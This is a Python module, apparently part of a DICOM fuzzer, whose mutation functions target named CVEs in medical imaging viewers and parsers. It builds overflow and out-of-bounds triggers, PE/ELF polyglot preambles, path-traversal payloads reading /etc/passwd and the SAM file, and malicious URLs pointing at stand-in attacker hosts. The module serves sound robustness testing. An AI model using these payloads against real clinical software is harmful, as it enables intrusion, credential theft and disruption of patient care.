"""CVE-Inspired Mutation Strategies.

Mutation strategies based on known DICOM vulnerabilities and CVEs.
These target specific vulnerability patterns found in real-world DICOM parsers.

CVEs Covered (20 total mutations across 14 CVEs):

2025 CVEs:
- CVE-2025-5943: MicroDicom heap buffer overflow in pixel data parsing
- CVE-2025-35975: MicroDicom out-of-bounds write (June 2025)
- CVE-2025-11266: GDCM out-of-bounds write in encapsulated PixelData fragments
- CVE-2025-53618: GDCM JPEG codec out-of-bounds read (info leak)
- CVE-2025-53619: GDCM JPEG codec out-of-bounds read
- CVE-2025-1001: RadiAnt DICOM Viewer certificate validation bypass (MITM)

2024 CVEs:
- CVE-2024-22100: MicroDicom heap-based buffer overflow
- CVE-2024-25578: MicroDicom out-of-bounds write (lack of validation)
- CVE-2024-28877: MicroDicom stack-based buffer overflow
- CVE-2024-33606: MicroDicom URL scheme bypass

Legacy CVEs:
- CVE-2019-11687: DICOM preamble polyglot (PE/DICOM, ELF/DICOM)
- CVE-2020-29625: DCMTK denial of service via malformed length fields
- CVE-2021-41946: ClearCanvas path traversal via filename injection
- CVE-2022-24193: OsiriX denial of service via deep nesting

References:
- CISA ICS-CERT Medical Advisories (ICSMA-24-060-01, ICSMA-25-037-01,
  ICSMA-25-051-01, ICSMA-25-160-01, ICSMA-25-345-01)
- NIST NVD DICOM entries
- OWASP Medical Device Security

"""

from __future__ import annotations

import random
import struct
from dataclasses import dataclass
from enum import Enum
from typing import Any


class CVECategory(Enum):
    """Categories of CVE-inspired mutations."""

    HEAP_OVERFLOW = "heap_overflow"
    STACK_OVERFLOW = "stack_overflow"
    BUFFER_OVERFLOW = "buffer_overflow"
    INTEGER_OVERFLOW = "integer_overflow"
    INTEGER_UNDERFLOW = "integer_underflow"
    OUT_OF_BOUNDS_WRITE = "out_of_bounds_write"
    OUT_OF_BOUNDS_READ = "out_of_bounds_read"
    PATH_TRAVERSAL = "path_traversal"
    DENIAL_OF_SERVICE = "denial_of_service"
    POLYGLOT = "polyglot"
    DEEP_NESTING = "deep_nesting"
    MALFORMED_LENGTH = "malformed_length"
    ENCAPSULATED_PIXEL = "encapsulated_pixel"
    JPEG_CODEC = "jpeg_codec"
    CERTIFICATE_VALIDATION = "certificate_validation"
    URL_SCHEME_BYPASS = "url_scheme_bypass"


@dataclass
class CVEMutation:
    """A CVE-inspired mutation."""

    cve_id: str
    category: CVECategory
    description: str
    mutation_func: str  # Name of function to apply
    severity: str = "high"
    target_component: str = ""  # e.g., "pixel_data", "transfer_syntax"

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "cve_id": self.cve_id,
            "category": self.category.value,
            "description": self.description,
            "severity": self.severity,
            "target_component": self.target_component,
        }


# CVE-2025-5943: MicroDicom Heap Buffer Overflow
# Heap overflow in pixel data parsing due to insufficient bounds checking


def mutate_heap_overflow_pixel_data(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-5943 heap overflow.

    The vulnerability occurs when:
    1. Rows/Columns values are very large
    2. BitsAllocated creates large allocation
    3. PixelData is smaller than expected allocation

    Returns mutated DICOM bytes.
    """
    result = bytearray(data)

    # Find Rows tag (0028,0010) and set to large value
    rows_tag = b"\x28\x00\x10\x00"
    idx = data.find(rows_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set rows to 0xFFFF (65535)
        result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)

    # Find Columns tag (0028,0011) and set to large value
    cols_tag = b"\x28\x00\x11\x00"
    idx = data.find(cols_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set columns to 0xFFFF
        result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)

    # Find BitsAllocated (0028,0100) and set to 16
    bits_tag = b"\x28\x00\x00\x01"
    idx = data.find(bits_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", 16)

    return bytes(result)


def mutate_integer_overflow_dimensions(data: bytes) -> bytes:
    """Create mutation targeting integer overflow in dimension calculation.

    When Rows * Columns * BitsAllocated/8 overflows, allocation is too small.
    """
    result = bytearray(data)

    # Values that cause overflow when multiplied
    overflow_values = [
        (0x8000, 0x8000),  # 32768 * 32768 overflows 32-bit
        (0xFFFF, 0xFFFF),  # 65535 * 65535 overflows 32-bit
        (0x10000, 0x10000),  # If 32-bit, this overflows
    ]

    rows, cols = random.choice(overflow_values)

    # Find and modify Rows
    rows_tag = b"\x28\x00\x10\x00"
    idx = data.find(rows_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", rows & 0xFFFF)

    # Find and modify Columns
    cols_tag = b"\x28\x00\x11\x00"
    idx = data.find(cols_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", cols & 0xFFFF)

    return bytes(result)


# CVE-2020-29625: DCMTK DoS via malformed length fields


def mutate_malformed_length_field(data: bytes) -> bytes:
    """Create mutation targeting malformed length fields.

    DCMTK and other parsers can hang or crash with:
    1. Undefined length (0xFFFFFFFF) in non-sequence elements
    2. Length larger than remaining file
    3. Negative length interpretations
    """
    result = bytearray(data)

    # Find VR length fields (look for common VRs followed by length)
    vr_patterns = [b"OB", b"OW", b"OF", b"SQ", b"UN", b"UC", b"UR", b"UT"]

    for vr in vr_patterns:
        idx = 0
        while True:
            idx = result.find(vr, idx)
            if idx == -1:
                break

            # Check if this looks like a VR (should be after tag)
            if idx >= 4 and idx + 6 < len(result):
                # Set undefined length (0xFFFFFFFF)
                if random.random() < 0.3:
                    result[idx + 2 : idx + 6] = b"\xff\xff\xff\xff"

            idx += 1

    return bytes(result)


def mutate_oversized_length(data: bytes) -> bytes:
    """Create mutation with length larger than remaining file."""
    result = bytearray(data)

    # Find length fields and set to larger than remaining
    # Look for explicit VR length patterns
    for i in range(len(result) - 8):
        # Check for 4-byte length after VR
        if result[i : i + 2] in [b"OB", b"OW", b"SQ", b"UN"]:
            if i + 6 < len(result):
                remaining = len(result) - i
                # Set length to 2x remaining
                oversized = remaining * 2
                result[i + 4 : i + 8] = struct.pack("<I", oversized)
                break

    return bytes(result)


# CVE-2021-41946: Path traversal via filename injection


def mutate_path_traversal_filename(data: bytes) -> bytes:
    """Create mutation targeting path traversal in file references.

    Inject path traversal sequences in Referenced File ID and similar fields.
    """
    result = bytearray(data)

    # Path traversal payloads
    payloads = [
        b"../../../etc/passwd",
        b"..\\..\\..\\windows\\system32\\config\\sam",
        b"/etc/passwd",
        b"\\\\server\\share\\file",
        b"file:///etc/passwd",
        b"....//....//....//etc/passwd",
        b"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    ]

    payload = random.choice(payloads)

    # Look for Referenced File ID (0004,1500) or similar
    ref_file_tag = b"\x04\x00\x00\x15"
    idx = data.find(ref_file_tag)
    if idx != -1 and idx + 8 < len(result):
        # Replace value with path traversal payload
        vr_length_offset = idx + 4
        if vr_length_offset + 4 < len(result):
            # Set length to payload length
            result[vr_length_offset + 2 : vr_length_offset + 4] = struct.pack(
                "<H", len(payload)
            )
            # Insert payload (may corrupt file, but that's the point)
            result = (
                result[: vr_length_offset + 4]
                + payload
                + result[vr_length_offset + 4 + len(payload) :]
            )

    return bytes(result)


# CVE-2022-24193: Deep nesting DoS


def mutate_deep_nesting(data: bytes) -> bytes:
    """Create mutation with extremely deep sequence nesting.

    Deep nesting can exhaust stack space or cause exponential parsing time.
    """
    result = bytearray(data)

    # Create a deeply nested sequence structure
    nesting_depth = random.randint(100, 500)

    # Sequence Item delimiter
    item_start = b"\xfe\xff\x00\xe0"  # Item
    item_end = b"\xfe\xff\x0d\xe0"  # Item Delimitation Item

    # Build nested structure
    nested = b""
    for _ in range(nesting_depth):
        nested = (
            item_start + b"\xff\xff\xff\xff" + nested + item_end + b"\x00\x00\x00\x00"
        )

    # Find a sequence tag and append nested structure
    sq_tag = b"\x08\x00\x05\x11"  # Referenced Series Sequence
    idx = data.find(sq_tag)
    if idx != -1:
        result = result[: idx + 4] + nested + result[idx + 4 :]
    else:
        # Append to end before trailing bytes
        result = result[:-4] + nested + result[-4:]

    return bytes(result)


# CVE-2019-11687: DICOM Preamble Polyglot


def mutate_pe_polyglot_preamble(data: bytes) -> bytes:
    """Create PE/DICOM polyglot by injecting PE header in preamble.

    The 128-byte DICOM preamble can contain executable code.
    """
    result = bytearray(data)

    # Minimal PE header stub (DOS header)
    pe_header = (
        b"MZ"  # DOS signature
        + b"\x90" * 58  # DOS header padding
        + struct.pack("<I", 0x80)  # PE header offset at 0x80
        + b"\x00" * 64  # More padding
    )

    # Ensure we have at least 128 bytes of preamble
    if len(result) < 132:
        return bytes(result)

    # Inject PE header into preamble (first 128 bytes)
    result[: len(pe_header)] = pe_header[:128]

    return bytes(result)


def mutate_elf_polyglot_preamble(data: bytes) -> bytes:
    """Create ELF/DICOM polyglot by injecting ELF header in preamble."""
    result = bytearray(data)

    # Minimal ELF header
    elf_header = (
        b"\x7fELF"  # ELF magic
        + b"\x01"  # 32-bit
        + b"\x01"  # Little endian
        + b"\x01"  # ELF version
        + b"\x00" * 9  # Padding
        + struct.pack("<H", 2)  # ET_EXEC
        + struct.pack("<H", 3)  # EM_386
        + struct.pack("<I", 1)  # EV_CURRENT
        + b"\x00" * 100  # Rest of header
    )

    if len(result) < 132:
        return bytes(result)

    # Inject ELF header into preamble
    result[: min(len(elf_header), 128)] = elf_header[:128]

    return bytes(result)


# Transfer Syntax Manipulation (multiple CVEs)


def mutate_invalid_transfer_syntax(data: bytes) -> bytes:
    """Inject invalid or malicious transfer syntax UIDs.

    Some parsers crash or behave unexpectedly with:
    1. Unknown transfer syntax UIDs
    2. Mismatched transfer syntax (e.g., compressed header, uncompressed data)
    3. Malformed UID strings
    """
    result = bytearray(data)

    malicious_uids = [
        b"1.2.3.4.5.6.7.8.9.0" + b"." * 50,  # Excessively long UID
        b"0.0",  # Minimal UID
        b"1.2.840.10008.1.2.4.9999",  # Non-existent JPEG variant
        b"\x00" * 64,  # Null bytes
        b"AAAA" * 16,  # ASCII (invalid UID format)
        b"1.2.840.10008.1.2.1\x00\x00\x00",  # Embedded nulls
    ]

    uid = random.choice(malicious_uids)

    # Find Transfer Syntax UID (0002,0010)
    ts_tag = b"\x02\x00\x10\x00"
    idx = data.find(ts_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set length and value
        result[idx + 6 : idx + 8] = struct.pack("<H", len(uid))
        result = result[: idx + 8] + uid + result[idx + 8 + len(uid) :]

    return bytes(result)


# CVE-2025-11266: GDCM Encapsulated PixelData Fragment Underflow


def mutate_encapsulated_pixeldata_underflow(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-11266 integer underflow.

    GDCM vulnerability in encapsulated PixelData fragment parsing:
    - Unsigned integer underflow in buffer indexing
    - Triggered by malformed fragment structures
    - Causes out-of-bounds write leading to segfault

    Attack vector: Malformed encapsulated PixelData with invalid fragment sizes.
    """
    result = bytearray(data)

    # Encapsulated PixelData markers
    pixel_data_tag = b"\xe0\x7f\x10\x00"  # (7FE0,0010) PixelData
    item_tag = b"\xfe\xff\x00\xe0"  # Item delimiter
    seq_delim = b"\xfe\xff\xdd\xe0"  # Sequence delimitation

    # Find PixelData tag
    idx = data.find(pixel_data_tag)
    if idx == -1:
        # No PixelData found, create malicious encapsulated structure
        # This simulates encapsulated JPEG data with malformed fragments
        malicious_encap = (
            pixel_data_tag
            + b"OB"  # VR
            + b"\x00\x00"  # Reserved
            + b"\xff\xff\xff\xff"  # Undefined length
            # Fragment 0 (offset table) - malformed
            + item_tag
            + b"\x00\x00\x00\x00"  # Empty offset table
            # Fragment 1 - underflow trigger: size that causes underflow
            + item_tag
            + struct.pack("<I", 0xFFFFFFFF)  # Max uint32 size (underflow trigger)
            + b"\xff" * 16  # Minimal data
            # Fragment 2 - zero size (edge case)
            + item_tag
            + b"\x00\x00\x00\x00"
            # Sequence end
            + seq_delim
            + b"\x00\x00\x00\x00"
        )
        result = result[:-4] + malicious_encap + result[-4:]
    else:
        # Modify existing PixelData to trigger underflow
        # Find and corrupt fragment lengths
        search_start = idx + 8
        fragment_idx = result.find(item_tag, search_start)
        if fragment_idx != -1:
            # Set fragment length to trigger underflow (0xFFFFFFFF)
            length_pos = fragment_idx + 4
            if length_pos + 4 < len(result):
                result[length_pos : length_pos + 4] = b"\xff\xff\xff\xff"

    return bytes(result)


def mutate_fragment_count_mismatch(data: bytes) -> bytes:
    """Create mutation with mismatched fragment counts.

    Targets parsers that pre-allocate based on offset table but receive
    different number of actual fragments.
    """
    result = bytearray(data)

    pixel_data_tag = b"\xe0\x7f\x10\x00"
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    # Create structure with offset table claiming more fragments than exist
    malicious = (
        pixel_data_tag
        + b"OB\x00\x00"
        + b"\xff\xff\xff\xff"  # Undefined length
        # Offset table claiming 10 fragments
        + item_tag
        + struct.pack("<I", 40)  # 10 offsets * 4 bytes
        + struct.pack("<I", 0) * 10  # 10 offset entries
        # But only provide 1 actual fragment
        + item_tag
        + struct.pack("<I", 8)
        + b"\x00" * 8
        # End sequence early
        + seq_delim
        + b"\x00\x00\x00\x00"
    )

    # Append to end
    result = result[:-4] + malicious + result[-4:]
    return bytes(result)


# CVE-2025-53618/53619: GDCM JPEG Codec Out-of-Bounds Read


def mutate_jpeg_codec_oob_read(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-53618/53619 JPEG codec OOB read.

    GDCM JPEGBITSCodec::InternalCode vulnerability:
    - Out-of-bounds read during JPEG decompression
    - Can leak memory contents (information disclosure)
    - Triggered by malformed JPEG stream in encapsulated PixelData

    Attack vector: Crafted JPEG with invalid Huffman tables or segment sizes.
    """
    result = bytearray(data)

    # JPEG markers
    soi = b"\xff\xd8"  # Start of Image
    eoi = b"\xff\xd9"  # End of Image
    sof0 = b"\xff\xc0"  # Start of Frame (baseline DCT)
    dht = b"\xff\xc4"  # Define Huffman Table
    sos = b"\xff\xda"  # Start of Scan

    # Create malformed JPEG that triggers OOB read in Huffman decoding
    malformed_jpeg = (
        soi
        # SOF0 with invalid dimensions that cause buffer miscalculation
        + sof0
        + struct.pack(">H", 11)  # Length
        + b"\x08"  # Precision
        + struct.pack(">H", 0xFFFF)  # Height (max)
        + struct.pack(">H", 0xFFFF)  # Width (max)
        + b"\x01"  # Components
        + b"\x01\x11\x00"  # Component spec
        # DHT with truncated/invalid Huffman table
        + dht
        + struct.pack(">H", 5)  # Length too short for valid table
        + b"\x00"  # Table class/ID
        + b"\xff\xff"  # Invalid counts (will cause OOB read)
        # SOS with invalid scan header
        + sos
        + struct.pack(">H", 8)  # Length
        + b"\x01"  # Components
        + b"\x01\x00"  # Component selector
        + b"\x00\x3f\x00"  # Spectral selection
        # Minimal scan data (truncated)
        + b"\x00" * 4
        + eoi
    )

    # Wrap in DICOM encapsulated format
    pixel_data_tag = b"\xe0\x7f\x10\x00"
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    encapsulated = (
        pixel_data_tag
        + b"OB\x00\x00"
        + b"\xff\xff\xff\xff"
        # Empty offset table
        + item_tag
        + b"\x00\x00\x00\x00"
        # JPEG fragment
        + item_tag
        + struct.pack("<I", len(malformed_jpeg))
        + malformed_jpeg
        # End
        + seq_delim
        + b"\x00\x00\x00\x00"
    )

    # Append to data
    result = result[:-4] + encapsulated + result[-4:]
    return bytes(result)


def mutate_jpeg_truncated_stream(data: bytes) -> bytes:
    """Create mutation with truncated JPEG stream.

    Parser may read beyond buffer when stream ends unexpectedly.
    """
    result = bytearray(data)

    # Minimal JPEG that's truncated mid-scan
    truncated_jpeg = (
        b"\xff\xd8"  # SOI
        b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"  # APP0
        b"\xff\xdb\x00\x43\x00"  # DQT header
        + b"\x10" * 64  # Quantization table
        + b"\xff\xc0\x00\x0b\x08\x00\x10\x00\x10\x01\x01\x11\x00"  # SOF0
        + b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00"  # SOS header
        # Truncate here - no scan data or EOI
    )

    pixel_data_tag = b"\xe0\x7f\x10\x00"
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    encapsulated = (
        pixel_data_tag
        + b"OB\x00\x00"
        + b"\xff\xff\xff\xff"
        + item_tag
        + b"\x00\x00\x00\x00"
        + item_tag
        + struct.pack("<I", len(truncated_jpeg))
        + truncated_jpeg
        + seq_delim
        + b"\x00\x00\x00\x00"
    )

    result = result[:-4] + encapsulated + result[-4:]
    return bytes(result)


# CVE-2025-35975: MicroDicom Out-of-Bounds Write (June 2025)
# CISA Advisory: ICSMA-25-160-01
# CVSS: 8.4 (High)


def mutate_oob_write_pixel_data(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-35975 out-of-bounds write.

    MicroDicom DICOM Viewer vulnerability:
    - Out-of-bounds write due to insufficient validation of user-supplied data
    - Exploitable via malicious DCM file
    - Can allow arbitrary code execution

    Attack vector: Malformed pixel data with specific dimension/size mismatches.
    """
    result = bytearray(data)

    # Target specific dimension combinations that trigger OOB write
    # The vulnerability occurs when calculated buffer size differs from actual
    oob_triggers = [
        # (rows, cols, bits_allocated) - combinations that cause OOB
        (1, 0xFFFE, 16),  # Near-max columns with minimal rows
        (0xFFFE, 1, 16),  # Near-max rows with minimal columns
        (256, 256, 32),  # Large bits allocated
        (512, 512, 24),  # 24-bit (unusual) allocation
    ]

    rows, cols, bits = random.choice(oob_triggers)

    # Modify Rows (0028,0010)
    rows_tag = b"\x28\x00\x10\x00"
    idx = data.find(rows_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", rows)

    # Modify Columns (0028,0011)
    cols_tag = b"\x28\x00\x11\x00"
    idx = data.find(cols_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", cols)

    # Modify BitsAllocated (0028,0100)
    bits_tag = b"\x28\x00\x00\x01"
    idx = data.find(bits_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", bits)

    # Add undersized PixelData to trigger the write beyond bounds
    pixel_data_tag = b"\xe0\x7f\x10\x00"
    idx = data.find(pixel_data_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set a small PixelData length that doesn't match dimensions
        if idx + 12 < len(result):
            result[idx + 8 : idx + 12] = struct.pack("<I", 64)  # Only 64 bytes

    return bytes(result)


# CVE-2024-25578: MicroDicom Out-of-Bounds Write (2024)
# CISA Advisory: ICSMA-24-060-01
# CVSS: 7.8 (High)


def mutate_oob_write_lack_validation(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-25578 out-of-bounds write.

    MicroDicom vulnerability due to lack of proper validation:
    - Memory corruption within the application
    - Triggered by malformed DCM file

    Attack vector: Malformed element lengths and value representations.
    """
    result = bytearray(data)

    # Find explicit VR elements and corrupt their lengths
    explicit_vrs = [b"OB", b"OW", b"OF", b"OD", b"SQ", b"UN", b"UC", b"UR", b"UT"]

    mutations_applied = 0
    for vr in explicit_vrs:
        idx = 0
        while mutations_applied < 3:  # Limit mutations per file
            idx = result.find(vr, idx)
            if idx == -1:
                break

            # Check if this looks like a valid VR position (after 4-byte tag)
            if idx >= 4 and idx + 8 < len(result):
                # For OB/OW/OF/OD/SQ/UN/UC/UR/UT, length is at offset +4 (4 bytes)
                length_offset = idx + 4
                if length_offset + 4 < len(result):
                    # Set length to a value that causes OOB write
                    if random.random() < 0.5:
                        # Length pointing past end of file
                        result[length_offset : length_offset + 4] = struct.pack(
                            "<I", len(result) * 2
                        )
                        mutations_applied += 1

            idx += 1

    return bytes(result)


# CVE-2024-22100: MicroDicom Heap-Based Buffer Overflow
# CISA Advisory: ICSMA-24-060-01
# CVSS: 7.8 (High)


def mutate_heap_overflow_dcm_parsing(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-22100 heap buffer overflow.

    MicroDicom heap-based buffer overflow:
    - Exploitable by opening malicious DCM file
    - Allows remote code execution
    - Low complexity attack

    Attack vector: Specific combinations of DICOM elements that overflow heap.
    """
    result = bytearray(data)

    # Target Private Creator elements which are often parsed into fixed buffers
    private_creator_tag = b"\x09\x00\x10\x00"  # (0009,0010) Private Creator
    idx = data.find(private_creator_tag)

    if idx == -1:
        # Inject a private creator with overflow payload
        # Insert after file meta header (after first 132 bytes typically)
        insert_pos = min(200, len(result) - 4)

        # Create oversized private creator element
        overflow_payload = (
            private_creator_tag
            + b"LO"  # VR
            + struct.pack("<H", 0xFFFF)  # Max length
            + b"A" * 256  # Overflow data
        )
        result = result[:insert_pos] + overflow_payload + result[insert_pos:]
    else:
        # Modify existing private creator length
        if idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)

    # Also target SOP Instance UID for additional overflow vector
    sop_uid_tag = b"\x08\x00\x18\x00"  # (0008,0018)
    idx = data.find(sop_uid_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set oversized length
        result[idx + 6 : idx + 8] = struct.pack("<H", 512)

    return bytes(result)


# CVE-2024-28877: MicroDicom Stack-Based Buffer Overflow
# CISA Advisory: ICSMA-24-060-01
# CVSS: 8.7 (High)


def mutate_stack_overflow_dcm(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-28877 stack buffer overflow.

    MicroDicom stack-based buffer overflow:
    - User interaction required (open malicious file)
    - Allows arbitrary code execution
    - Affects version 2023.3 and prior

    Attack vector: Deeply nested structures or oversized string elements.
    """
    result = bytearray(data)

    # Stack overflows often triggered by:
    # 1. Recursive parsing of deeply nested sequences
    # 2. Large string values copied to stack buffers

    # Create deeply nested sequence that may overflow stack
    nesting_depth = random.randint(200, 1000)

    item_start = b"\xfe\xff\x00\xe0"  # Item
    item_end = b"\xfe\xff\x0d\xe0"  # Item Delimitation
    sq_start = b"\x08\x00\x15\x11"  # Referenced Series Sequence

    # Build recursive sequence structure
    nested = b""
    for _ in range(nesting_depth):
        nested = (
            sq_start
            + b"SQ\x00\x00"
            + b"\xff\xff\xff\xff"  # Undefined length
            + item_start
            + b"\xff\xff\xff\xff"
            + nested
            + item_end
            + b"\x00\x00\x00\x00"
            + b"\xfe\xff\xdd\xe0"  # Sequence delimitation
            + b"\x00\x00\x00\x00"
        )

    # Also inject oversized Patient Name (stack buffer target)
    patient_name_tag = b"\x10\x00\x10\x00"  # (0010,0010)
    idx = data.find(patient_name_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set length to trigger stack copy overflow
        result[idx + 6 : idx + 8] = struct.pack("<H", 4096)
        # Pad with overflow data
        overflow_data = b"A" * 4096
        result = result[: idx + 8] + overflow_data + result[idx + 8 :]

    # Append nested structure
    result = result[:-4] + nested + result[-4:]

    return bytes(result)


# CVE-2024-33606: MicroDicom URL Scheme Bypass
# CISA Advisory: ICSMA-24-060-01
# CVSS: 8.8 (High)


def mutate_url_scheme_bypass(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-33606 URL scheme bypass.

    MicroDicom URL scheme vulnerability:
    - Bypass of security restrictions via crafted URLs in DICOM elements
    - Can lead to arbitrary file access or code execution

    Attack vector: Malicious URLs in Retrieve URL or similar elements.
    """
    result = bytearray(data)

    # Malicious URL payloads for various bypass techniques
    url_payloads = [
        b"file:///C:/Windows/System32/config/SAM",
        b"file://localhost/etc/passwd",
        b"\\\\attacker.com\\share\\payload.exe",
        b"http://127.0.0.1:8080/../../etc/passwd",
        b"javascript:alert(1)",  # If rendered in web view
        b"data:text/html,<script>alert(1)</script>",
        b"file:///proc/self/environ",
        b"dict://attacker:11111/",
        b"gopher://attacker:70/_",
        b"ldap://attacker/exploit",
    ]

    payload = random.choice(url_payloads)

    # Target Retrieve URL (0008,1190) or Retrieve URI (0040,E010)
    retrieve_url_tag = b"\x08\x00\x90\x11"  # (0008,1190) Retrieve URL
    retrieve_uri_tag = b"\x40\x00\x10\xe0"  # (0040,E010) Retrieve URI

    # Try to find and modify existing URL element
    for tag in [retrieve_url_tag, retrieve_uri_tag]:
        idx = data.find(tag)
        if idx != -1 and idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", len(payload))
            result = result[: idx + 8] + payload + result[idx + 8 + len(payload) :]
            break
    else:
        # Inject new Retrieve URL element
        insert_pos = min(300, len(result) - 4)
        url_element = (
            retrieve_url_tag + b"UR" + struct.pack("<H", len(payload)) + payload
        )
        result = result[:insert_pos] + url_element + result[insert_pos:]

    return bytes(result)


# CVE-2025-1001: RadiAnt DICOM Viewer Certificate Validation Bypass
# CISA Advisory: ICSMA-25-051-01
# CVSS: 5.7 (Medium)


def mutate_certificate_validation_bypass(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-1001 certificate validation bypass.

    RadiAnt DICOM Viewer vulnerability:
    - Improper certificate validation in update mechanism
    - Allows MITM attacks with malicious updates

    Note: This mutation simulates the attack pattern by embedding
    malicious update metadata in DICOM elements that could be
    processed by viewers with similar vulnerabilities.

    Attack vector: Inject update-related URLs/paths in DICOM metadata.
    """
    result = bytearray(data)

    # Payloads that simulate malicious update redirection
    update_payloads = [
        b"https://attacker.com/DicomViewer_Update.exe",
        b"http://localhost:8080/malicious_update.msi",
        b"\\\\evil.com\\updates\\viewer.exe",
        b"https://update.legitimate-domain.com.attacker.com/update",
        b"https://DicomViewer.com@attacker.com/update.exe",
    ]

    payload = random.choice(update_payloads)

    # Inject in Institution Address or similar text field
    # that might be displayed or processed
    institution_addr_tag = b"\x08\x00\x81\x00"  # (0008,0081) Institution Address
    station_name_tag = b"\x08\x00\x10\x10"  # (0008,1010) Station Name

    for tag in [institution_addr_tag, station_name_tag]:
        idx = data.find(tag)
        if idx != -1 and idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", len(payload))
            result = result[: idx + 8] + payload + result[idx + 8 + len(payload) :]
            break
    else:
        # Inject as Software Versions (0018,1020)
        software_tag = b"\x18\x00\x20\x10"
        insert_pos = min(250, len(result) - 4)
        element = software_tag + b"LO" + struct.pack("<H", len(payload)) + payload
        result = result[:insert_pos] + element + result[insert_pos:]

    return bytes(result)


# Registry of all CVE mutations

CVE_MUTATIONS: list[CVEMutation] = [
    CVEMutation(
        cve_id="CVE-2025-5943",
        category=CVECategory.HEAP_OVERFLOW,
        description="MicroDicom heap buffer overflow in pixel data parsing",
        mutation_func="mutate_heap_overflow_pixel_data",
        severity="critical",
        target_component="pixel_data",
    ),
    CVEMutation(
        cve_id="CVE-2025-5943",
        category=CVECategory.INTEGER_OVERFLOW,
        description="Integer overflow in dimension calculation",
        mutation_func="mutate_integer_overflow_dimensions",
        severity="critical",
        target_component="image_dimensions",
    ),
    CVEMutation(
        cve_id="CVE-2020-29625",
        category=CVECategory.MALFORMED_LENGTH,
        description="DCMTK DoS via undefined length fields",
        mutation_func="mutate_malformed_length_field",
        severity="high",
        target_component="vr_length",
    ),
    CVEMutation(
        cve_id="CVE-2020-29625",
        category=CVECategory.MALFORMED_LENGTH,
        description="Length larger than remaining file",
        mutation_func="mutate_oversized_length",
        severity="high",
        target_component="vr_length",
    ),
    CVEMutation(
        cve_id="CVE-2021-41946",
        category=CVECategory.PATH_TRAVERSAL,
        description="ClearCanvas path traversal via filename injection",
        mutation_func="mutate_path_traversal_filename",
        severity="high",
        target_component="referenced_file",
    ),
    CVEMutation(
        cve_id="CVE-2022-24193",
        category=CVECategory.DEEP_NESTING,
        description="OsiriX DoS via deep sequence nesting",
        mutation_func="mutate_deep_nesting",
        severity="medium",
        target_component="sequence",
    ),
    CVEMutation(
        cve_id="CVE-2019-11687",
        category=CVECategory.POLYGLOT,
        description="PE/DICOM polyglot in preamble",
        mutation_func="mutate_pe_polyglot_preamble",
        severity="critical",
        target_component="preamble",
    ),
    CVEMutation(
        cve_id="CVE-2019-11687",
        category=CVECategory.POLYGLOT,
        description="ELF/DICOM polyglot in preamble",
        mutation_func="mutate_elf_polyglot_preamble",
        severity="critical",
        target_component="preamble",
    ),
    CVEMutation(
        cve_id="GENERIC",
        category=CVECategory.BUFFER_OVERFLOW,
        description="Invalid transfer syntax UID injection",
        mutation_func="mutate_invalid_transfer_syntax",
        severity="medium",
        target_component="transfer_syntax",
    ),
    # CVE-2025-11266: GDCM encapsulated PixelData vulnerabilities
    CVEMutation(
        cve_id="CVE-2025-11266",
        category=CVECategory.INTEGER_UNDERFLOW,
        description="GDCM integer underflow in encapsulated PixelData fragments",
        mutation_func="mutate_encapsulated_pixeldata_underflow",
        severity="high",
        target_component="encapsulated_pixel_data",
    ),
    CVEMutation(
        cve_id="CVE-2025-11266",
        category=CVECategory.ENCAPSULATED_PIXEL,
        description="Fragment count mismatch in offset table",
        mutation_func="mutate_fragment_count_mismatch",
        severity="high",
        target_component="encapsulated_pixel_data",
    ),
    # CVE-2025-53618/53619: GDCM JPEG codec vulnerabilities
    CVEMutation(
        cve_id="CVE-2025-53618",
        category=CVECategory.OUT_OF_BOUNDS_READ,
        description="GDCM JPEG codec OOB read via malformed Huffman tables",
        mutation_func="mutate_jpeg_codec_oob_read",
        severity="high",
        target_component="jpeg_codec",
    ),
    CVEMutation(
        cve_id="CVE-2025-53619",
        category=CVECategory.JPEG_CODEC,
        description="Truncated JPEG stream causing OOB read",
        mutation_func="mutate_jpeg_truncated_stream",
        severity="high",
        target_component="jpeg_codec",
    ),
    # CVE-2025-35975: MicroDicom Out-of-Bounds Write (June 2025)
    CVEMutation(
        cve_id="CVE-2025-35975",
        category=CVECategory.OUT_OF_BOUNDS_WRITE,
        description="MicroDicom OOB write via malformed pixel data dimensions",
        mutation_func="mutate_oob_write_pixel_data",
